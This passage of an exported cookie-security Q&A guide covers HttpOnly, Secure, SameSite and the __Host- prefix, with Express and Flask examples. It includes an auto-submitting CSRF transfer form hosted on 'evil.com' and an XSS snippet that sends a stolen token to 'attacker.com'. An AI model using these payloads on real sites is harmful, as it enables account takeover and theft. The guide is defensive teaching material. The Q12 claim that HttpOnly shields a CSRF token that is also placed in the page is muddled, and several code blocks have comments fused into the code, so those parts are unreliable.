crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8084-ad97-f70e0f8d66cb" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly
// Browser will reject if Secure is missing</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8099-81f0-f139a386d49a"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8017-ac88-ee759231e1f2" class=""><strong>Q10: An attacker successfully performs a CSRF attack even though your cookies have HttpOnly. Why?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8084-84ef-f7c4a5e83942" class=""><strong>Answer:</strong> HttpOnly does NOT protect against CSRF attacks. The attacker&#x27;s CSRF attack succeeded because:</p></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80d7-b662-fe3d919e748b" class="numbered-list" start="1"><li><strong>HttpOnly only prevents JavaScript access</strong> - It doesn&#x27;t prevent the browser from automatically sending cookies with requests</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8079-ba70-df894757041b" class="numbered-list" start="2"><li><strong>CSRF doesn&#x27;t need JavaScript</strong> - CSRF attacks work by tricking the browser into automatically including cookies</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80c2-8bee-e13f300820e9" class="numbered-list" start="3"><li><strong>Missing SameSite attribute</strong> - Without <code>SameSite</code>, cookies are sent with all requests, including cross-site requests</li></ol></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8002-b3a8-f161d736f404" class=""><strong>Vulnerable configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80b9-a011-f732299a6287" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; HttpOnly; Secure
// Missing SameSite - CSRF attack succeeds</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80cf-8ad3-e9952e5e7a8e" class=""><strong>How the attack works:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-803a-9e38-f8165c638711" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- Attacker&#x27;s website: evil.com --&gt;&lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot; id=&quot;csrf-form&quot;&gt;
  &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;attacker-account&quot;&gt;
  &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot;&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById(&#x27;csrf-form&#x27;).submit();&lt;/script&gt;
</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8074-8ce7-d889774cfa5d" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">POST https://bank.com/transfer HTTP/1.1
Host: bank.com
Cookie: sessionId=abc123  // Browser automatically includes cookie
Content-Type: application/x-www-form-urlencoded

to=attacker-account&amp;amount=10000
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8075-a727-cd9c2a60dc97" class=""><strong>Solution:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8023-ba88-f682649e094d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Add SameSite attributeSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
// Or use SameSite=Lax for better UXSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8029-acac-cd70af441987"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-804d-b0b6-e4e0c5633aa6" class=""><strong>Q11: Your multi-tenant SaaS application has cookies accessible across subdomains. How do you fix this?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8037-9060-df12f0d5fe7f" class=""><strong>Answer:</strong> Use the <code>__Host-</code> prefix to prevent subdomain access:</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-807b-8bdc-ed8018734a3b" class=""><strong>Problem:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-804a-b5ab-c34c29491f31" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Vulnerable - accessible to all subdomainsSet-Cookie: sessionId=abc123; Domain=.example.com; Secure; HttpOnly
// tenant1.example.com can access tenant2.example.com&#x27;s cookies</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8056-b3f7-f704d458d4b9" class=""><strong>Solution:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8061-b8b5-dc58e66a424d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Secure - only accessible to exact hostSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/
// tenant1.example.com cannot access tenant2.example.com&#x27;s cookies</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80fa-aa6d-fe8ef30bc686" class=""><strong>Why </strong><code><strong>__Host-</strong></code><strong> prefix works:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8024-9535-c49826592f45" class="bulleted-list"><li style="list-style-type:disc">Requires <code>Path=/</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80bc-9d4e-dc823516f734" class="bulleted-list"><li style="list-style-type:disc">Prohibits <code>Domain</code> attribute</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8035-942e-cff055d29b27" class="bulleted-list"><li style="list-style-type:disc">Cookie is only accessible to the exact host that set it</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-803e-9cbe-ce2a97bd8152" class="bulleted-list"><li style="list-style-type:disc">Prevents subdomain cookie access</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80b9-b08f-dda828a299ac" class=""><strong>Alternative (if you need subdomain sharing):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8058-8a50-e1f372b97c3b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Only if you actually need subdomain sharingSet-Cookie: sessionId=abc123; Domain=.example.com; Secure; HttpOnly; SameSite=Lax
// But ensure proper tenant isolation at application level</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-806d-92ab-d5080dd11584"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8035-a939-d6314407a1da" class=""><strong>Q12: Your CSRF tokens are being stolen via XSS. How do you protect them?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-800c-9bcd-fa9884c95c6d" class=""><strong>Answer:</strong> Store CSRF tokens in HttpOnly cookies:</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8092-b10a-fe435320402b" class=""><strong>Vulnerable approach:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80da-8275-e8df0e85adcd" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// CSRF token in regular cookie (accessible to JavaScript)Set-Cookie: csrf_token=abc123
// XSS can steal it:
&lt;script&gt;
  var token = document.cookie.match(/csrf_token=([^;]+)/)[1];
  fetch(&#x27;https://attacker.com/steal?token=&#x27; + token);
&lt;/script&gt;
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80a3-8e12-c4231f85529f" class=""><strong>Secure approach:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8060-804e-c331dbbb160c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// CSRF token in HttpOnly cookieSet-Cookie: csrf_token=abc123; HttpOnly; Secure; SameSite=Strict

// XSS cannot access it:
&lt;script&gt;
  console.log(document.cookie);// Does NOT include csrf_token// Token cannot be stolen
&lt;/script&gt;
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8067-8e0e-c32c9eb42c7e" class=""><strong>How CSRF tokens work with HttpOnly:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-803b-8492-d094c6c103b9" class="numbered-list" start="1"><li>Server generates unique token for each session</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80a6-bac1-e1ae5f08bbaa" class="numbered-list" start="2"><li>Token stored in HttpOnly cookie (prevents XSS theft)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80c9-b04e-dddd7940ae11" class="numbered-list" start="3"><li>Token also embedded in forms (hidden input or meta tag)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8018-867e-d4fc81b2c850" class="numbered-list" start="4"><li>On form submission, server compares cookie token with form token</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-808d-994d-c6395758b3f8" class="numbered-list" start="5"><li>If they match, request is legitimate</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80a7-9204-c38e3606f8b6" class="numbered-list" start="6"><li>If they don&#x27;t match, request is rejected</li></ol></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80ad-9b7e-d8e42fe73d6f" class=""><strong>Important note:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-806a-99e2-d7731b1ce6b4" class="bulleted-list"><li style="list-style-type:disc">HttpOnly on CSRF token prevents XSS from stealing it</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-802f-a25a-fb273a06cec7" class="bulleted-list"><li style="list-style-type:disc">But HttpOnly itself doesn&#x27;t prevent CSRF - the token validation does</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80a2-8c85-cb65bec8a2a9" class="bulleted-list"><li style="list-style-type:disc">The token must be accessible to the form (via hidden input or meta tag)</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8096-b872-fecf7227b3d8"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-80e2-b131-fc1e7878474d" class=""><strong>Implementation Questions</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-800a-aaf1-e313c505593a" class=""><strong>Q13: How do you set secure cookies in Node.js/Express?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8079-a09d-c1bd3429afef" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8000-8696-cea40dc0f195" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const express = require(&#x27;express&#x27;);
const cookieParser = require(&#x27;cookie-parser&#x27;);
const app = express();

app.use(cookieParser());

app.post(&#x27;/login&#x27;, (req, res) =&gt; {
  const sessionToken = generateSessionToken();

  res.cookie(&#x27;__Host-sessionId&#x27;, sessionToken, {
    secure: true,// HTTPS onlyhttpOnly: true,// No JavaScript accesssameSite: &#x27;strict&#x27;,// CSRF protectionpath: &#x27;/&#x27;,// Site-widemaxAge: 3600000,// 1 hour (in milliseconds)// Note: __Host- prefix requires no domain option
  });

  res.json({ success: true });
});
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8057-aebf-e9c89e27bcc2" class=""><strong>Key points:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80bf-ae83-fbbd5171b58b" class="bulleted-list"><li style="list-style-type:disc">Use <code>secure: true</code> for HTTPS-only</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8043-820f-e57be0ae9437" class="bulleted-list"><li style="list-style-type:disc">Use <code>httpOnly: true</code> for XSS protection</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8076-8455-ecec222a8583" class="bulleted-list"><li style="list-style-type:disc">Use <code>sameSite: &#x27;strict&#x27;</code> or <code>&#x27;lax&#x27;</code> for CSRF protection</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80ad-b6e5-d76ff1e241fa" class="bulleted-list"><li style="list-style-type:disc">Use <code>__Host-</code> prefix for maximum security (no domain option)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-804b-967a-e2b7aadf87a6" class="bulleted-list"><li style="list-style-type:disc"><code>maxAge</code> is in milliseconds</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8002-84af-dbaea50f0112"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8064-bbf7-c162fbf1344c" class=""><strong>Q14: How do you set secure cookies in Python/Flask?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-803e-9f51-e3275aec11b2" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80ef-a55d-d8c89c79561a" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from flask import Flask, make_response

app = Flask(__name__)

@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])
def login():
    session_token = generate_session_token()
    response = make_response({&#x27;success&#x27;: True})

    response.set_cookie(
        &#x27;__Host-sessionId&#x27;,
        value=session_token,
        secure=True,# HTTPS only
        httponly=True,# No JavaScript access
        samesite=&#x27;Strict&#x27;,# CSRF protection
        path=&#x27;/&#x27;,# Site-wide
        max_age=3600,# 1 hour (in seconds)# Note: __Host- prefix requires no domain parameter
    )

    return response
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f3-8d8d-fa225fd1068c" class=""><strong>Key points:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8055-aab0-cf1f16c3ae1a" class="bulleted-list"><li style="list-style-type:disc">Use <code>secure=True</code> for HTTPS-only</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-803e-9103-e95e0a99b785" class="bulleted-list"><li style="list-style-type:disc">Use <code>httponly=True</code> for XSS protection</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80a6-bb18-f069f2864ba3" class="bulleted-list"><li style="list-style-type:disc">Use <code>samesite=&#x27;Strict&#x27;</code> or <code>&#x27;Lax&#x27;</code> for CSRF protection</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8048-ab9d-d94e5fe999f1" class="bulleted-list"><li style="list-style-type:disc"><code>max_age</code> is in seconds (not milliseconds)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80de-a8c8-d7a8464abe1f" class="bulleted-list"><li style="list-style-type:disc">No <code>domain</code> parameter for <code>__Host-</code> prefix</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80c1-bbfe-de08bdac4354"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8039-8717-c99360cec5d4" class=""><strong>Q15: How do you verify that cookies are set correctly?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8011-b818-ccc4dc285155" class=""><strong>Answer:</strong> Multiple ways to verify:</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-805d-be59-c8173e127343" class=""><strong>1. Browser DevTools:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80bf-8f81-c9ba7c88f245" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. Open DevTools (F12)
2. Go to Application/Storage tab (Chrome) or Storage tab (Firefox)
3. Click Cookies
4. View cookie attributes:
   - HttpOnly: ✓ (checkmark)
   - Secure: ✓ (checkmark)
   - SameSite: Strict/Lax/None
   - Path: /
   - Expires: (date)
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8030-9b32-c09836e86fe6" class=""><strong>2. Command line (curl):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-805c-8b4c-ce8fa29bc8f3" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Check Set-Cookie header
curl -I https://example.com/login

# Response should show:
Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8017-94fe-da7e452a8674" class=""><strong>3. Browser Console:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8017-83c9-f036269f61e8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// HttpOnly cookies should NOT appearconsole.log(document.cookie);
// Should NOT include HttpOnly cookies// Check if cookie is sent with requests// Use Network tab in DevTools</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8053-be58-de4d84ed3877" class=""><strong>4. Online tools:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80b3-98d2-e27512985ae1" class="bulleted-list"><li style="list-style-type:disc">SecurityHeaders.com</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8063-a024-dd804d36f86f" class="bulleted-list"><li style="list-style-type:disc">Cookie-Editor browser extension</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8025-90d0-c50a34681f2b" class="bulleted-list"><li style="list-style-type:disc">Browser DevTools Network tab</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8087-b7ff-dbb9f128b1a7"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-8047-bc80-d6603008f5b7" class=""><strong>Troubleshooting Questions</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8037-8144-e885b586db38" class=""><strong>Q16: Cookies are not being set. What could be wrong?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d0-99ea-eabea80742c7" class=""><strong>Answer:</strong> Common issues:</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f2-b314-d23ef1434af9" class=""><strong>1. Missing Secure on HTTP:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8038-8b6c-cdcbd2a385d9" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Problem: Secure cookie on HTTP connection// Browser will reject itSet-Cookie: sessionId=abc123; Secure
// Solution: Use HTTPS or remove Secure (not recommended)</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80bb-8e02-d08275768886" class=""><strong>2. Invalid SameSite=None without Secure:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80a4-a1ec-fe4bcb254913" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Problem: SameSite=None requires SecureSet-Cookie: sessionId=abc123; SameSite=None
// Browser will reject it// Solution: Add Secure attributeSet-Cookie: sessionId=abc123; SameSite=None; Secure
